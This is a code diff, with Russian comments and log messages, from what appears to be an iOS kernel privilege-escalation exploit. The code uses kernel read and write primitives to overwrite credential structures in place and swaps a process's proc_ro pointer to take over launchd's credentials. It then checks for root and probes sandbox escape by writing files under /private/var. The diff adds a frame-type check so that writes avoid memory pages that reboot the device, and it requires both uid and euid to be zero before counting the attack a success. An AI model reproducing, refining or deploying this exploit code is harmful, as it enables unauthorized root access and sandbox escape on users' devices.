@@ -1848,6 +1848,26 @@ static BOOL kpPAIsManaged(uint64_t pa)
            pa < kconstant(physBase) + kconstant(physSize);
 }
 
+// Aperture-write gate: early_kwrite64 only lands on heap-typed frames
+// (gHeapFrameType / 0x21). Types 0x18/0x15/0x0b/0x37 reboot. Unknown FTE
+// fail-closed for writes.
+static BOOL kpApertureWritable(uint64_t pa)
+{
+    if (!pa || !gFrameTableVA) return NO;
+    if (!kpPAIsManaged(pa)) return NO;
+    int t = kpFrameTypeOf(pa);
+    if (t < 0) return NO;
+    if (t == 0x18 || t == 0x15 || t == 0x0b || t == 0x37) return NO;
+    if (gHeapTypeKnown) return (uint8_t)t == gHeapFrameType;
+    return t == 0x21;
+}
+
+// P1: both real and effective uid. gT18Root / readback-only is NOT enough.
+static BOOL kpP1Verified(void)
+{
+    return getuid() == 0 && geteuid() == 0;
+}
+
 + (uint64_t)frameTableVAWithLog:(NSMutableString *)r
 {
     if (gFrameTableVA) return gFrameTableVA;
@@ -4456,13 +4476,13 @@ e10fail:
 
     if (stuck) {
         // 5. Verify: getuid() перечитывает proc_ro->p_ucred на каждый вызов
-        //    (доказано EXP-09) — с форжем это ucred launchd. Проба на
-        //    unsandbox — запись в /private/var/root.
+        //    (доказано EXP-09) — с форжем это ucred launchd. P1 = uid AND euid.
+        //    Проба на unsandbox — запись в /private/var/root.
         newUid = getuid();
         newGid = getgid();
-        uidRoot = (newUid == 0);
-        kpNote(r, [NSString stringWithFormat:@"  после подмены: getuid()=%d getgid()=%d%@",
-                  newUid, newGid, uidRoot ? @" ← ROOT" : @""]);
+        uidRoot = kpP1Verified();
+        kpNote(r, [NSString stringWithFormat:@"  после подмены: getuid()=%d geteuid()=%d getgid()=%d%@",
+                  newUid, (int)geteuid(), newGid, uidRoot ? @" ← P1" : @""]);
 
         const char *probePath = "/private/var/root/kexproof-e11-probe.txt";
         errno = 0;
@@ -4502,20 +4522,22 @@ e10fail:
     }
 
     if (uidRoot && unsandboxOK && restored) {
-        [r appendString:@"\n=== E11 PASS: root + unsandbox через proc_ro-swap. Записано: 8 байт в наш proc (heap); launchd и его proc_ro не писались; p_proc_ro восстановлен. ===\n"];
+        [r appendString:@"\n=== E11 PASS: P1 (uid+euid 0) + unsandbox через proc_ro-swap. Записано: 8 байт в наш proc (heap); launchd и его proc_ro не писались; p_proc_ro восстановлен. ===\n"];
     }
     else if (uidRoot && restored) {
-        [r appendString:@"\n=== E11 ЧАСТИЧНО: uid 0 получен, но /private/var/root не открылся — sandbox/MAC держит (label кеширован на task?). Подмена восстановлена, паники не было. ===\n"];
+        [r appendString:@"\n=== E11 ЧАСТИЧНО: P1 получен, но /private/var/root не открылся — sandbox/MAC держит (label кеширован на task?). Подмена восстановлена, паники не было. ===\n"];
     }
     else if (!restored) {
         [r appendString:@"\n=== E11 FAIL: restore не подтверждён — см. КРИТИЧНО выше ===\n"];
     }
     else if (stuck) {
-        [r appendFormat:@"\n=== E11 FAIL: указатель подменялся и восстановлен чисто, но getuid()=%d — creds кешируются не из proc_ro? См. лог ===\n", newUid];
+        [r appendFormat:@"\n=== E11 FAIL: указатель подменялся и восстановлен чисто, но P1 нет (getuid=%d geteuid=%d) — creds кешируются не из proc_ro? См. лог ===\n", newUid, (int)geteuid()];
     }
     else {
         [r appendString:@"\n=== E11 FAIL: подмена не прилипла (kwrite по proc-зоне не работает?); слот цел, restore-проверка сошлась — паники не было ===\n"];
     }
+    [r appendFormat:@"\n[VERIFY] GETUID=%d GETEUID=%d E11_RESTORE_MATCH=%d P1=%d P2=0 P3=0 T18_FLAG=%d\n",
+     (int)getuid(), (int)geteuid(), restored ? 1 : 0, kpP1Verified() ? 1 : 0, gT18Root ? 1 : 0];
     return r;
 }
 
@@ -9885,9 +9907,22 @@ if (0) {  // 2.0.35: записи в cred-пространство выреза�
                                 uint32_t lu = (uint32_t)early_kread64(alias + uoff2 + 0x18);
                                 if (rw0 != rwL || lu != uid32) continue;
                                 n18hit++;
-                                kpNote(r, [NSString stringWithFormat:@"  [T18-KWRITE] ★ ucred_rw* совпал: pa=%#llx (кандидат %u) — патч uid-кластера через alias %#llx",
+                                kpNote(r, [NSString stringWithFormat:@"  [T18-KWRITE] ★ ucred_rw* совпал: pa=%#llx (кандидат %u) — проверка FTE перед патчем alias %#llx",
                                           (unsigned long long)pa, n18lo, (unsigned long long)alias]);
-                                // RMW-патч через early_kwrite64 (мягкий отказ, без паники)
+                                // FTE gate: aperture write only on heap-typed frames.
+                                // ucred page is often type 0x18 → early_kwrite64 = reboot.
+                                int fteT = kpFrameTypeOf(pa);
+                                BOOL wrOK = kpApertureWritable(pa);
+                                kpNote(r, [NSString stringWithFormat:@"  [T18-GATE] pa=%#llx FTE type=0x%02x heap=0x%02x writable=%@",
+                                          (unsigned long long)pa, fteT & 0xff,
+                                          gHeapTypeKnown ? gHeapFrameType : 0xff,
+                                          wrOK ? @"YES" : @"NO — skip aperture write"]);
+                                if (!wrOK) {
+                                    kpNote(r, [NSString stringWithFormat:@"  [T18-GATE] кандидат pa=%#llx type=0x%02x — aperture-патч НЕ безопасн (поле 0x18/RO). Путь: e11Tapped (proc_ro-swap) или C3/N1. pagePA не берём.",
+                                              (unsigned long long)pa, fteT & 0xff]);
+                                    continue;
+                                }
+                                // RMW-патч через early_kwrite64 (только после FTE-gate)
                                 uint64_t q20 = early_kread64(alias + uoff2 + 0x20);
                                 uint64_t q28 = early_kread64(alias + uoff2 + 0x28);
                                 early_kwrite64(alias + uoff2 + 0x18, 0);
@@ -9895,18 +9930,24 @@ if (0) {  // 2.0.35: записи в cred-пространство выреза�
                                 early_kwrite64(alias + uoff2 + 0x28, q28 & 0xFFFFFFFF00000000ULL);
                                 early_kwrite64(alias + uoff2 + 0x68, 0);
                                 early_kwrite64(alias + uoff2 + 0x78, 0);
-                                uid_t gk = getuid(); gid_t ggk = getgid();
+                                uid_t gk = getuid();
+                                uid_t gek = geteuid();
+                                gid_t ggk = getgid();
                                 uint32_t cruN = (uint32_t)early_kread64(ucF + 0x18);
-                                kpNote(r, [NSString stringWithFormat:@"  [T18-KWRITE] readback cr_uid=%u getuid()=%u getgid()=%u — %@",
-                                          cruN, gk, ggk, (gk == 0 || cruN == 0) ? @"ROOT ★★" : @"не прилипло"]);
-                                if (gk == 0 || cruN == 0) {
+                                BOOL p1 = kpP1Verified();
+                                kpNote(r, [NSString stringWithFormat:@"  [T18-KWRITE] readback cr_uid=%u getuid()=%u geteuid()=%u getgid()=%u — %@",
+                                          cruN, gk, gek, ggk, p1 ? @"P1 ★★" : @"не прилипло (cr_uid-only не считается)"]);
+                                if (p1) {
                                     pagePA = pa;
                                     gT18Root = YES;
-                                    kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — T18-KWRITE in-place ucred через aperture-alias ===");
+                                    kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 && geteuid()==0 — T18-KWRITE in-place ucred через aperture-alias ===");
                                     FILE *fp = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
                                     kpNote(r, [NSString stringWithFormat:@"  [T18-KWRITE] sandbox-проба: %@",
                                               fp ? @"УСПЕХ — label снят" : @"ОТКАЗ — label на месте"]);
                                     if (fp) { fputs("root via T18-KWRITE\n", fp); fclose(fp); }
+                                } else {
+                                    kpNote(r, [NSString stringWithFormat:@"  [T18-KWRITE] cr_uid=%u при getuid=%u geteuid=%u — readback≠P1, gT18Root не ставим",
+                                              cruN, gk, gek]);
                                 }
                             }
                             kpNote(r, [NSString stringWithFormat:@"  [T18-ENUM] кадров типа %d: всего %u, высоких %u, низких %u, ucred_rw-хитов %u — pagePA=%#llx",
